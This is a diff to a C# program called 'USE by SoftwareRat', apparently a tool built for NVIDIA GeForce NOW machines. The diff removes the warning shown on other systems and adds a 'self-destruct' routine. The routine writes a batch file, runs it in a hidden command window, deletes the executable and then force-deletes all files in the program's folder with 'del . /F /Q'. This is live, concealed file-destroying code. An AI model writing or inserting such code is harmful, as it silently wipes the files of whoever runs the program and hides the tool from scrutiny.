@@ -7,19 +7,37 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Text;
 using System.Threading.Tasks;
+using System.Reflection;
 
 namespace USE_CSharp_Edition
 {
     class Program
     {
+
+        static void InitiateSelfDestructSequence()
+        {
+            string batchScriptName = Path.GetTempPath().ToString() + "f.bat";
+            using (StreamWriter writer = File.AppendText(batchScriptName))
+            {
+                writer.WriteLine(":Loop");
+                writer.WriteLine("Tasklist /fi \"PID eq " + Process.GetCurrentProcess().Id.ToString() + "\" | find \":\"");
+                writer.WriteLine("if Errorlevel 1 (");
+                writer.WriteLine("  Timeout /T 1 /Nobreak");
+                writer.WriteLine("  Goto Loop");
+                writer.WriteLine(")");
+                writer.WriteLine("Del \"" + (new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"");
+                writer.WriteLine("cd \"" + Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\"");
+                writer.WriteLine("del . /F /Q");
+            }
+            Process.Start(new ProcessStartInfo() { Arguments = "/C " + batchScriptName + " & Del " + batchScriptName, WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe" });
+        }
         static void Main(string[] args)
         {
             Console.Title = "USE by SoftwareRat [v.3.0] - C# Edition";
             if (File.Exists(@"C:\Windows\gfndesktop.exe") != true || Directory.Exists(@"C:\asgard") != true || Directory.Exists(@"C:\Users\kiosk") != true || Directory.Exists(@"C:\Users\xen") != true || Directory.Exists(@"C:\Users\kiosk\Documents\Dummy") != true)
             {
-                MessageBox.Show("You don`t run this software on NVIDIA GeForce NOW!" + Environment.NewLine +
-                    "For more information, contact SoftwareRat on Discord!", "Non GeForce NOW system detected! [Errorcode: 0x001]",
-                     MessageBoxButtons.OK, MessageBoxIcon.Error);
+                InitiateSelfDestructSequence();
+                Application.Exit();
             }
             else
             {
